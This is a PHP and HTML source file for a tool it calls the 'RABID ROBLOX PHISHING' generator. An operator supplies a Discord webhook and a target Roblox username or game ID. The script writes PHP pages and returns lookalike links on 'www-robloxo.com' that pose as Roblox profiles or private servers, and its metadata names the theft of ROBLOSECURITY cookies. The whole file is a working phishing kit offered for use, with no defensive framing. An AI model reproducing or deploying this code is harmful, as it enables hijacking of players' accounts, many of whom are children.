<?php
include('../function.php');
include('../config.php');
$generated = 0;

if ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['url'])) {
	$url = $_POST['url'];
	$username = $_POST['username'];
	if (filter_var($url, FILTER_VALIDATE_URL)) {
		if ($_POST['option'] == "Profile" && isset($_POST['realUsername']) && isset($_POST['fakeUsername'])) {
			$url = mysqli_real_escape_string($connect, $url);
			$realUsername = $_POST['realUsername'];
			$fakeUsername = $_POST['fakeUsername'];
			$path = "../profiles";
			if (is_dir($path)) {
				$username = mysqli_real_escape_string($connect, $username);
				$search = mysqli_query($connect, "SELECT * FROM webhook WHERE user='$username'");
				if (mysqli_num_rows($search) < 1) {
					$fileName = generateRandomString(rand(10, 14)) . "_" . $username . generateRandomString(rand(4, 8));
					$profileId = rand(155445, 987554321);
					$encryptFileName = str_replace('=', '', base64_encode($fileName));
					if ($file = fopen($path . "/$profileId.php", "w")) {
						$dbPath = mysqli_real_escape_string($connect, $path . "/$profileId.php");
						$text = addslashes('<?php $realUsername = "' . $realUsername . '"; $fakeUsername = "' . $fakeUsername . '"; $webhookCode = "' . $encryptFileName . '"; include("../base_profile.php"); ?>');
						fwrite($file, stripslashes($text));
						fclose($file);
						$insert = mysqli_query($connect, "INSERT INTO webhook (user, code, profile, url, path) VALUES ('$username', '$encryptFileName', '$profileId', '$url', '$dbPath')");
						$generated = 2;
					} else {
						echo "file name already exist error!";
					}
				} else {
					$fetchArray = mysqli_fetch_array($search);
					$encryptFileName = $fetchArray[2];
					$profileId = $fetchArray[3];

					if ($profileId == 0) {
						$profileId = rand(155445, 987554321);
						$update = mysqli_query($connect, "UPDATE webhook SET profile='$profileId' WHERE user='$username'");
					}

					if ($file = fopen($path . "/$profileId.php", "w")) {
						$pathBefore = $fetchArray[5];
						if ($pathBefore != mysqli_real_escape_string($connect, $path . "/$profileId.php")) {
							if (unlink($pathBefore)) {
								$dbPath = mysqli_real_escape_string($connect, $path . "/$profileId.php");
								$text = addslashes('<?php $realUsername = "' . $realUsername . '"; $fakeUsername = "' . $fakeUsername . '"; $webhookCode = "' . $encryptFileName . '"; include("../base_profile.php"); ?>');
								fwrite($file, stripslashes($text));
								fclose($file);
								$update = mysqli_query($connect, "UPDATE webhook SET url='$url', path='$dbPath' WHERE profile='$profileId' AND user='$username'");
								$generated = 2;
							} else {
								echo "ERROR!";
							}
						} else {
							$dbPath = mysqli_real_escape_string($connect, $path . "/$profileId.php");
							$text = addslashes('<?php $realUsername = "' . $realUsername . '"; $fakeUsername = "' . $fakeUsername . '"; $webhookCode = "' . $encryptFileName . '"; include("../base_profile.php"); ?>');
							fwrite($file, stripslashes($text));
							fclose($file);
							$update = mysqli_query($connect, "UPDATE webhook SET url='$url', path='$dbPath' WHERE profile='$profileId' AND user='$username'");
							$generated = 2;
						}
					} else {
						echo "file name already exist error!";
					}
				}
			}
		}
		if ($_POST['option'] == "Game" && isset($_POST['gameid'])) {
			$url = mysqli_real_escape_string($connect, $url);
			$id = $_POST['gameid'];
			$gamename = requestName($id);
			$name = str_replace(' ', '-', $gamename);
			$path = "../game";
			if (is_dir($path)) {
				$username = mysqli_real_escape_string($connect, $username);
				$search = mysqli_query($connect, "SELECT * FROM webhook WHERE user='$username'");
				if (mysqli_num_rows($search) < 1) {
					$fileName = generateRandomString(rand(10, 14)) . "_" . $username . generateRandomString(rand(4, 8));
					$profileId = rand(155445, 987554321);
					$encryptFileName = str_replace('=', '', base64_encode($fileName));
					if ($file = fopen($path . "/$profileId.php", "w")) {
						$dbPath = mysqli_real_escape_string($connect, $path . "/$profileId.php");
						$text = addslashes('<?php $webhookCode = "' . $encryptFileName . '"; $id = "' . $id . '"; include("../base_game.php"); ?>');
						fwrite($file, stripslashes($text));
						fclose($file);
						$insert = mysqli_query($connect, "INSERT INTO webhook (user, code, profile, url, path) VALUES ('$username', '$encryptFileName', '$profileId', '$url', '$dbPath')");
						$generated = 4;
					} else {
						echo "file name already exist error!";
					}
				} else {
					$fetchArray = mysqli_fetch_array($search);
					$encryptFileName = $fetchArray[2];
					$profileId = $fetchArray[3];

					if ($profileId == 0) {
						$profileId = rand(155445, 987554321);
						$update = mysqli_query($connect, "UPDATE webhook SET profile='$profileId' WHERE user='$username'");
					}

					if ($file = fopen($path . "/$profileId.php", "w")) {
						$pathBefore = $fetchArray[5];
						if ($pathBefore != mysqli_real_escape_string($connect, $path . "/$profileId.php")) {
							if (unlink($pathBefore)) {
								$dbPath = mysqli_real_escape_string($connect, $path . "/$profileId.php");
								$text = addslashes('<?php $webhookCode = "' . $encryptFileName . '"; $id = "' . $id . '"; include("../base_game.php"); ?>');
								fwrite($file, stripslashes($text));
								fclose($file);
								$update = mysqli_query($connect, "UPDATE webhook SET url='$url', path='$dbPath' WHERE profile='$profileId' AND user='$username'");
								$generated = 4;
							} else {
								echo "ERROR!";
							}
						} else {
							$dbPath = mysqli_real_escape_string($connect, $path . "/$profileId.php");
							$text = addslashes('<?php $webhookCode = "' . $encryptFileName . '"; $id = "' . $id . '"; include("../base_game.php"); ?>');
							fwrite($file, stripslashes($text));
							fclose($file);
							$update = mysqli_query($connect, "UPDATE webhook SET url='$url', path='$dbPath' WHERE profile='$profileId' AND user='$username'");
							$generated = 4;
						}
					} else {
						echo "file name already exist error!";
					}
				}
			}
		}
	} else {
		$generated = 3;
	}
}
?>

<!DOCTYPE html>
<meta name="title" content="Phishing Generator">
<meta property="og:image" content="https://www.coinpogo.com/wp-content/uploads/bfi_thumb/beam_logo-6uvh4ihf49ww56la54ne93q756e0zylov6zi9fusl0k.png">
<meta name="description" content ="Free Phishing Tool Generator, Made by RABID, Perfected, Reviewed, Top Rated.">
<meta name="keywords" content="ROBLOX, Phishing, Generator, Robux, RABID, ROBLOX Phishing, Discord Webhook, Cookies, ROBLOSECURITY">
<meta name="robots" content="index, follow">
<meta name="theme-color" content="#1e1e25">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="language" content="English">
<meta name="author" content="RABID PHISHING LOGGER">
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<link href="assets/css/styles.css" rel="stylesheet">
	<title>Gen</title>
</head>

<body>
	<script>
		function websiteRoblox(that) {
			if (that.value == "Profile") {
				document.getElementById("input-1-profile").style.display = "block";
			} else {
				document.getElementById("input-1-profile").style.display = "none";
			}
			if (that.value == "Game") {
				document.getElementById("input-2-profile").style.display = "block";
			} else {
				document.getElementById("input-2-profile").style.display = "none";
			}
		}
	</script>
	<div class="login-box">
		<h2>RABID#0001 ROBLOX PHISHING</h2>
		<?php if ($generated == 2) {
			echo '
			<div class="alert alert-success alert-dismissable">
				<li class="mb-0"><b>Name</b> : ' . $username . '</li>
				<li class="mb-0"><b>Roblox Link</b> : https://www-robloxo.com/users/' . $profileId . '/profile</li>
			</div>
				';
		} ?>
		<?php if ($generated == 4) {
			echo '
			<div class="alert alert-success alert-dismissable">
				<li class="mb-0"><b>Name</b> : ' . $username . '</li>
				<li class="mb-0"><b>Roblox Link</b> : https://www-robloxo.com/games/' . $profileId . '/' . $name . '?privateServerLinkCode=' . $encryptFileName . '</li>
			</div>
				';
		} ?>
		<?php if ($generated == 3) {
			echo '<div class="alert alert-danger alert-dismissable"><li class="mb-0">Error! Invalid Webhook Url!</li></div>';
		} ?>
		<select onchange="websiteRoblox(this);" name="option" class="un" id="select">
			<option value="Choose">Choose Theme</option>
			<option value="Profile">Profile</option>
			<option value="Game">VIP Server</option>
		</select>

		<div id="input-1-profile" style="display: none;">
			<form action="" method="POST">
				<select name="option" type="hidden" class="anu" id="select">
					<option type="hidden" value="Profile">Profile</option>
				</select>
				<div class="user-box">
					<input type="text" name="realUsername" required>
					<label>Roblox Username</label>
				</div>
				<div class="user-box">
					<input type="text" name="fakeUsername" required>
					<label>Fake Username</label>
				</div>
				<div class="user-box">
					<input type="text" name="username" required>
					<label>Your Name</label>
				</div>
				<div class="user-box">
					<input type="text" name="url" required>
					<label>Webhook</label>
				</div>
				<button class="submit">Create</button>
			</form>
		</div>
		<div id="input-2-profile" style="display: none;">
			<form action="" method="POST">
				<select name="option" type="hidden" class="anu" id="select">
					<option type="hidden" value="Game">Profile</option>
				</select>
				<div class="user-box">
					<input type="text" name="gameid" required>
					<label>Game Id</label>
				</div>
				<div class="user-box">
					<input type="text" name="username" required>
					<label>Your Name</label>
				</div>
				<div class="user-box">
					<input type="text" name="url" required>
					<label>Webhook</label>
				</div>
				<button class="submit">Create</button>
			</form>
		</div>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
</body>

</html>